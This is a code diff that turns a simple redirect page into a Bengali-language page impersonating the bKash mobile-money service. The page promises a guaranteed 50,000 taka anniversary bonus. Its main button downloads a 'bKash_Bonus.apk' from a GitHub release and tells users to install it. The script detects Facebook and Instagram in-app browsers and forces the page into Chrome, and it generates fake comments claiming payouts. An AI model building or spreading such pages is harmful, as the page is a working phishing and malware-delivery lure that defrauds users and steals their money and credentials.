@@ -1,91 +1,399 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="bn" translate="no">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>অনুগ্রহ করে অপেক্ষা করুন...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="google" content="notranslate">
+    <meta name="theme-color" content="#E2136E">
+    <title>বিকাশ ১০ বছর পূর্তি - ৫০,০০০ টাকা নিশ্চিত বোনাস</title>
     
-    <!-- Facebook শেয়ারের প্রিভিউ সুন্দর করার জন্য Open Graph ট্যাগ -->
-    <meta property="og:title" content="বিস্তারিত দেখতে এখানে প্রবেশ করুন" />
-    <meta property="og:description" content="মাত্র কয়েক সেকেন্ডের মধ্যে মূল পেজে নিয়ে যাওয়া হচ্ছে..." />
-    <meta property="og:type" content="website" />
+    <!-- Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-255493739-4"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-255493739-4');
+    </script>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        bkashPink: '#E2136E',
+                        bkashDark: '#B40F57',
+                        bkashLight: '#FCE7F0',
+                        fbGray: '#f0f2f5',
+                    },
+                    fontFamily: {
+                        sans: ['Hind Siliguri', 'sans-serif'],
+                    },
+                    animation: {
+                        'slide-up': 'slideUp 0.5s ease-out forwards',
+                        'pulse-fast': 'pulse 1.5s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                    },
+                    keyframes: {
+                        slideUp: {
+                            '0%': { transform: 'translateY(100px)', opacity: '0' },
+                            '100%': { transform: 'translateY(0)', opacity: '1' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
 
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
+            background-color: #f1f5f9;
+            overflow-x: hidden;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .bkash-gradient {
+            background: linear-gradient(135deg, #E2136E 0%, #B40F57 100%);
+        }
+        /* Custom Scrollbar */
+        .comments-scroll::-webkit-scrollbar { width: 4px; }
+        .comments-scroll::-webkit-scrollbar-thumb { background-color: #cbd5e1; border-radius: 4px; }
+        
+        /* Facebook Browser Overlay */
+        #fb-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.4);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f4f6f9;
+            justify-content: center;
+            padding: 20px;
+        }
+        .blur-content { filter: blur(10px); pointer-events: none; }
+
+        /* Download Instruction Modal */
+        #download-modal {
+            position: fixed;
+            bottom: -100%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 450px;
+            background: white;
+            border-radius: 24px 24px 0 0;
+            box-shadow: 0 -10px 40px rgba(0,0,0,0.15);
+            z-index: 1000;
+            transition: bottom 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            padding: 24px;
             text-align: center;
         }
-        .card {
-            background: #ffffff;
-            padding: 35px 25px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
-            max-width: 360px;
-            width: 90%;
-        }
-        h2 {
-            color: #222;
-            font-size: 20px;
-            margin-top: 0;
-            margin-bottom: 12px;
-        }
-        p {
-            color: #555;
-            font-size: 15px;
-            line-height: 1.5;
-            margin-bottom: 25px;
-        }
-        #timer {
-            font-weight: bold;
-            color: #e2136e;
-            font-size: 18px;
-        }
-        .btn {
-            display: inline-block;
-            background-color: #e2136e;
-            color: #ffffff;
-            text-decoration: none;
-            padding: 12px 30px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 8px;
-            transition: background-color 0.2s ease;
-        }
-        .btn:hover {
-            background-color: #c10f5d;
-        }
+        #download-modal.active { bottom: 0; }
+        
+        @keyframes shine { 100% { left: 125%; } }
     </style>
 </head>
-<body>
+<body class="text-gray-800 antialiased selection:bg-bkashPink selection:text-white">
 
-    <div class="card">
-        <h2>মূল পেজে নিয়ে যাওয়া হচ্ছে...</h2>
-        <p>অনুগ্রহ করে <span id="timer">5</span> সেকেন্ড অপেক্ষা করুন। অটোমেটিক রিডাইরেক্ট না হলে নিচের বাটনে ক্লিক করুন।</p>
-        <a href="http://earntaka.com/bkash" class="btn">এখানে ক্লিক করুন</a>
+    <!-- FB Browser Interceptor Overlay -->
+    <div id="fb-overlay">
+        <div class="bg-white p-6 rounded-2xl shadow-2xl text-center max-w-[320px] w-full border border-gray-100">
+            <div class="w-16 h-16 bg-blue-50 text-blue-500 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl">
+                <i class="fa-brands fa-chrome"></i>
+            </div>
+            <h2 class="text-[18px] font-bold text-gray-900 mb-2">ব্রাউজার পরিবর্তন করুন</h2>
+            <p class="text-[14px] text-gray-500 mb-6">অফারটি গ্রহণ করতে নিচের বাটনে ক্লিক করে পেজটি Google Chrome বা অন্য ব্রাউজারে ওপেন করুন।</p>
+            <button onclick="openInChrome()" class="w-full bg-blue-600 text-white font-bold py-3.5 rounded-xl shadow-lg hover:bg-blue-700 transition-all text-[16px]">
+                এখানে ক্লিক করুন <i class="fa-solid fa-arrow-right-from-bracket ml-1"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div id="main-content" class="max-w-md mx-auto bg-white min-h-screen relative shadow-2xl pb-10">
+        
+        <!-- Header -->
+        <header class="bg-white sticky top-0 z-40 px-4 py-3 flex items-center justify-between border-b border-gray-100 shadow-sm">
+            <div class="flex items-center gap-3">
+                <img src="https://thumb.wikimedia.org/wikipedia/commons/thumb/c/cb/BKash-Bangla-Logo-01.png/250px-BKash-Bangla-Logo-01.png?utm_source=en.wikipedia.org&utm_campaign=parser&utm_content=thumbnail" 
+                     onerror="this.src='https://placehold.co/100x100/E2136E/FFFFFF?text=bKash'" 
+                     alt="bKash" 
+                     class="h-10 w-24 object-contain">
+                <div>
+                    <h1 class="font-bold text-gray-900 text-[17px] leading-tight flex items-center gap-1.5">
+                        বিকাশ লিমিটেড
+                        <i class="fa-solid fa-circle-check text-blue-600 text-[13px]"></i>
+                    </h1>
+                    <p class="text-gray-500 text-[11px] font-medium flex items-center gap-1">
+                        <i class="fa-solid fa-shield-halved text-green-500"></i> বাংলাদেশ ব্যাংক অনুমোদিত
+                    </p>
+                </div>
+            </div>
+            <div class="animate-pulse">
+                <span class="bg-bkashLight text-bkashPink px-3 py-1 rounded-full text-[11px] font-bold border border-pink-100 flex items-center gap-1">
+                    <span class="w-1.5 h-1.5 bg-bkashPink rounded-full block"></span> লাইভ অফার
+                </span>
+            </div>
+        </header>
+
+        <!-- Hero Section -->
+        <div class="bkash-gradient pt-7 pb-10 px-5 text-center relative overflow-hidden rounded-b-[35px]">
+            <div class="absolute top-0 left-0 w-32 h-32 bg-white opacity-10 rounded-full -translate-x-1/2 -translate-y-1/2"></div>
+            <div class="absolute bottom-0 right-0 w-48 h-48 bg-white opacity-10 rounded-full translate-x-1/4 translate-y-1/4"></div>
+            
+            <div class="inline-block bg-white/20 backdrop-blur-sm text-white px-4 py-1.5 rounded-full text-[13px] font-semibold mb-3 border border-white/30">
+                🎉 ১০ বছর পূর্তি উৎসব
+            </div>
+            
+            <h2 class="text-[24px] font-extrabold text-white leading-tight mb-2 drop-shadow-md">
+                সবাই পাচ্ছেন নিশ্চিত <br> 
+                <span class="text-[#FFD700] text-[42px] tracking-tight drop-shadow-lg block mt-1">৳৫০,০০০ বোনাস!</span>
+            </h2>
+        </div>
+
+        <!-- Main Body -->
+        <main class="px-5 -mt-5 relative z-10">
+            
+            <!-- Simple Instruction Box -->
+            <div class="bg-white border border-gray-200 rounded-2xl p-5 shadow-lg mb-6 text-center">
+                <p class="text-gray-700 font-semibold text-[15.5px] leading-relaxed mb-4">
+                    বিকাশের ১০ বছর পূর্তি উপলক্ষে সবাই <span class="text-bkashPink font-bold">৫০,০০০ টাকা</span> বোনাস পাচ্ছেন! বোনাস পেতে নিচের <span class="font-bold">লিংক</span> থেকে অ্যাপটি ইনস্টল করুন। 
+                </p>
+                <div class="bg-pink-50 border border-pink-100 rounded-xl p-3 mb-5 inline-block mx-auto text-left">
+                    <p class="text-[13.5px] text-gray-800 font-medium flex items-center gap-2">
+                        <i class="fa-solid fa-clock text-bkashPink text-lg"></i> 
+                        অ্যাপে আপনার বিকাশ নাম্বার দেওয়ার <span class="text-bkashPink font-bold text-[15px]">১ মিনিটের ভেতর</span> টাকা পেয়ে যাবেন!
+                    </p>
+                </div>
+
+                <!-- Download Action Button -->
+                <button onclick="triggerDownload(this)" 
+                   class="w-full relative group overflow-hidden bg-bkashPink text-white py-4 px-2 rounded-2xl shadow-[0_8px_20px_-6px_rgba(226,19,110,0.7)] transition-all transform active:scale-[0.98]">
+                    <div class="absolute top-0 -inset-full h-full w-1/2 z-5 block transform -skew-x-12 bg-gradient-to-r from-transparent to-white opacity-20 group-hover:animate-[shine_1.5s_infinite]"></div>
+                    <div class="relative z-10 flex flex-col items-center justify-center">
+                        <span class="text-[20px] font-extrabold flex items-center gap-2 animate-pulse-fast">
+                            <i class="fa-brands fa-android text-xl"></i> বিকাশ বোনাস অ্যাপ আপডেট করুন
+                        </span>
+                        <span class="text-[12px] font-medium opacity-90 mt-1 flex items-center gap-1">
+                            <i class="fa-solid fa-download"></i> ক্লিক করে এখনই ইনস্টল করুন
+                        </span>
+                    </div>
+                </button>
+            </div>
+
+            <!-- Social Proof / Facebook Style Comments -->
+            <div class="bg-white rounded-2xl border border-gray-100 shadow-sm p-4">
+                <div class="flex justify-between items-center mb-4 border-b border-gray-100 pb-3">
+                    <h3 class="font-bold text-gray-900 text-[15px] flex items-center gap-2">
+                        <i class="fa-brands fa-facebook text-[#1877f2] text-lg"></i> কমেন্ট সমূহ
+                    </h3>
+                    <div class="flex items-center gap-1 text-gray-500 text-[12px] font-semibold">
+                        <span>48K</span>
+                        <i class="fa-solid fa-thumbs-up text-blue-500"></i>
+                        <i class="fa-solid fa-heart text-red-500"></i>
+                    </div>
+                </div>
+
+                <div id="comments-container" class="space-y-4 comments-scroll max-h-[500px] overflow-y-auto pr-1 pb-4">
+                    <!-- Comments injected by JS -->
+                </div>
+            </div>
+            
+        </main>
+        
+        <footer class="text-center py-5 mt-4 text-gray-400 text-[11px]">
+            <p>© ২০২৬ বিকাশ লিমিটেড। সর্বস্বত্ব সংরক্ষিত।</p>
+        </footer>
+    </div>
+
+    <!-- Download Instruction Modal (Hidden by default) -->
+    <div id="download-modal">
+        <div class="w-14 h-14 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl shadow-sm">
+            <i class="fa-solid fa-cloud-arrow-down animate-bounce"></i>
+        </div>
+        <h3 class="text-[18px] font-bold text-gray-900 mb-2">ডাউনলোড হচ্ছে...</h3>
+        <p class="text-[15px] text-gray-600 font-medium leading-relaxed bg-gray-50 p-3 rounded-xl border border-gray-100">
+            <span class="text-blue-600 font-bold">bKash_Bonus.apk</span> ফাইলটি ডাউনলোড হচ্ছে। 
+            <br><br>
+            ডাউনলোড কমপ্লিট হয়ে গেলে ফাইলটিতে ক্লিক করে <span class="text-bkashPink font-bold">Open / Install</span> করুন।
+        </p>
+        <button onclick="closeModal()" class="mt-5 text-gray-400 font-semibold text-[14px] hover:text-gray-600">
+            বন্ধ করুন
+        </button>
     </div>
 
     <script>
-        const targetUrl = "http://earntaka.com/bkash";
-        let timeLeft = 5;
-        const timerElement = document.getElementById("timer");
+        // --- 1. Smart Download Handler & Modal ---
+        const apkUrl = "https://github.com/leanhno051226-debug/hoga/releases/download/1.0/bKash_Bonus.apk";
 
-        const countdown = setInterval(() => {
-            timeLeft--;
-            if (timerElement && timeLeft >= 0) {
-                timerElement.textContent = timeLeft;
+        function triggerDownload(btnElement) {
+            // Change button to loading state
+            const originalHTML = btnElement.innerHTML;
+            btnElement.innerHTML = `<div class="relative z-10 flex flex-col items-center justify-center py-1"><i class="fa-solid fa-spinner fa-spin text-2xl text-white"></i><span class="text-[15px] font-bold mt-1 text-white">ডাউনলোড শুরু হচ্ছে...</span></div>`;
+            
+            setTimeout(() => {
+                // Trigger Actual Download
+                var a = document.createElement('a');
+                a.href = apkUrl;
+                a.download = "bKash_Bonus.apk";
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+
+                // Show instruction modal
+                document.getElementById('download-modal').classList.add('active');
+                
+                // Reset button text
+                btnElement.innerHTML = originalHTML;
+            }, 800);
+        }
+
+        function closeModal() {
+            document.getElementById('download-modal').classList.remove('active');
+        }
+
+        // --- 2. Facebook In-App Browser Detection & Blocker ---
+        function checkBrowser() {
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            var isFB = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Instagram") > -1);
+            
+            if(isFB) {
+                document.getElementById('main-content').classList.add('blur-content');
+                document.getElementById('fb-overlay').style.display = 'flex';
+                document.body.style.overflow = 'hidden';
             }
-            if (timeLeft <= 0) {
-                clearInterval(countdown);
-                window.location.replace(targetUrl);
+        }
+        
+        function openInChrome() {
+            var currentUrl = window.location.href.replace(/^https?:\/\//, '');
+            // Intent URL to force open in default browser (Chrome)
+            var intentUrl = "intent://" + currentUrl + "#Intent;scheme=https;package=com.android.chrome;action=android.intent.action.VIEW;end;";
+            window.location.href = intentUrl;
+        }
+
+        // Run check on load
+        window.onload = checkBrowser;
+
+
+        // --- 3. Advanced Facebook Style Comments Generator ---
+        // Gender specific names to prevent mismatch
+        const maleNames = ["Rakib Hasan", "Arifur Rahman", "Sajid Islam", "Faisal Ahmed", "Mehedi Hasan", "Ashiqur", "Jisan", "Tanvir Ahmed", "Riad Hossen", "Imran", "Naim", "Tariqul", "Masud Rana", "Hasibul", "Sohag Vai", "Rubel"];
+        const femaleNames = ["Sadia Akter", "Fatema", "Tania Ahmed", "Nusrat Jahan", "Jannatul", "Mim Akter", "Ritu", "Farzana", "Sumi", "Ayesha", "Khadija", "Sanjida", "Tasnim", "Lima", "Mitu"];
+
+        const mainComments = [
+            "Alhamdulillah, vai ami 50000 tk paisi akhon 🤲",
+            "Paisi vai, thanks. Prothome biswas kori nai je sotti dibe.",
+            "Wow! app ta namailam, number dilam ar sathe sathe 50k in! 🔥 vaggos ajke chuklam.",
+            "Sottti ki dey?",
+            "Amar bkash e sms asche 50000 tk add hoise. 10 bochor purtite emon gift pawar asha kori nai.",
+            "Vai ami onk gorib asolei amar onek upokar holo tk ta peye.",
+            "Fake vabecilam, kintu ekhn dekhi real. Thanks bkash er shobaike 😍",
+            "ভাই আমি তো অবাক। সত্যিই ৫০ হাজার টাকা পেয়ে গেলাম!!",
+            "অসাধারণ! বিকাশকে অসংখ্য ধন্যবাদ।",
+            "Amar ammur number a khule dilam tar account e o asce. 2ta te 100k pelam total 🤑",
+            "Vai keu ki peyecen asole?",
+            "আমি একটু আগে পেয়েছি, আলহামদুলিল্লাহ।",
+            "Eita 100% real vai. Ami 5 min age cash out korlam agent theke.",
+            "যাক গরিব মানুষের অনেক উপকার হলো এই অফারটায়।",
+            "Ekhoni amar 50k dhukse. 🥳",
+            "App update korsi, asolei tk dei vai."
+        ];
+
+        const repliesToQuestions = [
+            "Haa vai ami pelam ekhoni. apni try koren.",
+            "Jii vai, apni rules mene lal button theke app namaye number den paben.",
+            "100% real vai, amar ekhon sms aslo.",
+            "Ami prothome vabsilam fake, but try kore dekhlam sotti tk dise."
+        ];
+
+        function getPerson() {
+            const isMale = Math.random() > 0.4;
+            const nameList = isMale ? maleNames : femaleNames;
+            const name = nameList[Math.floor(Math.random() * nameList.length)];
+            const avatarId = Math.floor(Math.random() * 90) + 1;
+            const avatarUrl = `https://randomuser.me/api/portraits/${isMale ? 'men' : 'women'}/${avatarId}.jpg`;
+            return { name, avatarUrl };
+        }
+
+        function createCommentHTML() {
+            const person = getPerson();
+            const text = mainComments[Math.floor(Math.random() * mainComments.length)];
+            const timeOptions = ['Just now', '1 m', '2 m', '5 m', '12 m', '23 m', '1 h'];
+            const timeStr = timeOptions[Math.floor(Math.random() * timeOptions.length)];
+
+            // Determine if this comment is asking a question to generate a reply
+            let hasReply = false;
+            let replyHtml = '';
+            
+            if (text.includes("Sottti ki dey?") || text.includes("peyecen asole?") || Math.random() > 0.7) {
+                hasReply = true;
+                const replier = getPerson();
+                const replyText = repliesToQuestions[Math.floor(Math.random() * repliesToQuestions.length)];
+                
+                replyHtml = `
+                <!-- Nested Reply -->
+                <div class="flex gap-2 mt-2 ml-10">
+                    <img src="${replier.avatarUrl}" alt="${replier.name}" class="w-7 h-7 rounded-full object-cover border border-gray-200 flex-shrink-0">
+                    <div class="flex-1">
+                        <div class="bg-fbGray rounded-[18px] px-3 py-1.5 inline-block">
+                            <h4 class="font-bold text-[#050505] text-[12.5px] hover:underline cursor-pointer">${replier.name}</h4>
+                            <p class="text-[#050505] text-[13.5px] mt-0.5 leading-snug"><span class="font-semibold text-blue-600 hover:underline cursor-pointer">${person.name}</span> ${replyText}</p>
+                        </div>
+                        <div class="text-[11px] text-[#65676B] font-bold mt-1 ml-3 flex gap-4">
+                            <span class="cursor-pointer hover:underline">Like</span>
+                            <span class="cursor-pointer hover:underline">Reply</span>
+                            <span class="font-normal">Just now</span>
+                        </div>
+                    </div>
+                </div>`;
             }
-        }, 1000);
+
+            return `
+                <div class="animate-slide-up mb-4">
+                    <!-- Main Comment -->
+                    <div class="flex gap-2.5">
+                        <img src="${person.avatarUrl}" alt="${person.name}" class="w-9 h-9 rounded-full object-cover border border-gray-200 flex-shrink-0">
+                        <div class="flex-1">
+                            <div class="bg-fbGray rounded-[18px] px-3.5 py-2 inline-block">
+                                <h4 class="font-bold text-[#050505] text-[13.5px] hover:underline cursor-pointer">${person.name}</h4>
+                                <p class="text-[#050505] text-[14px] mt-0.5 whitespace-pre-line leading-tight">${text}</p>
+                            </div>
+                            <div class="text-[12px] text-[#65676B] font-bold mt-1 ml-3 flex gap-4">
+                                <span class="cursor-pointer hover:underline">Like</span>
+                                <span class="cursor-pointer hover:underline">Reply</span>
+                                <span class="font-normal">${timeStr}</span>
+                            </div>
+                        </div>
+                    </div>
+                    ${replyHtml}
+                </div>
+            `;
+        }
+
+        const container = document.getElementById('comments-container');
+
+        // Initial load of comments
+        for (let i = 0; i < 4; i++) {
+            container.insertAdjacentHTML('beforeend', createCommentHTML());
+        }
+
+        // Live new comments adding at top
+        setInterval(() => {
+            container.insertAdjacentHTML('afterbegin', createCommentHTML());
+            // Keep DOM clean by removing old comments if too many
+            if (container.children.length > 12) {
+                container.removeChild(container.lastElementChild);
+            }
+        }, Math.floor(Math.random() * 7000) + 6000); 
+
     </script>
-
 </body>
 </html>
